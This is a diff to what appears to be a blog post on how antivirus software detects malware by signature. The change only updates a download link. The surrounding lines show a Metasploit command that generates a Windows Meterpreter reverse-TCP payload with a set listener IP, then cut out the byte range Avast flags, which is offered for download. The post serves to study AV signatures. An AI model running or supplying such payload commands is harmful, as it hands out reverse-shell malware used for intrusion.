@@ -41,7 +41,7 @@ To find out the 'bad string', I use the old bisection method to locate where the
     ~/metasploit-framework/msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.56.102 R > payload_raw
     cat payload_raw | cut -c614-663 > malicious.txt
 
-Ok, then I get the 'bad string' into `malicious.txt`. Scan it with Avast!, Avast! flag it as malware. You can download it [here](malicious.txt) and test it with your own avast.
+Ok, then I get the 'bad string' into `malicious.txt`. Scan it with Avast!, Avast! flag it as malware. You can download it [here](https://github.com/reverland/scripts/blob/master/else/malicious.txt) and test it with your own avast.
 
 Now we are sure AV softwares use signature to find malwares. It is true, whenever a new suspicious files uploaded to AV vendors(for example, upload it to [Virustotal](https://www.virustotal.com/)), the new malware's signature will be soon added to the virus signature database soon.
 
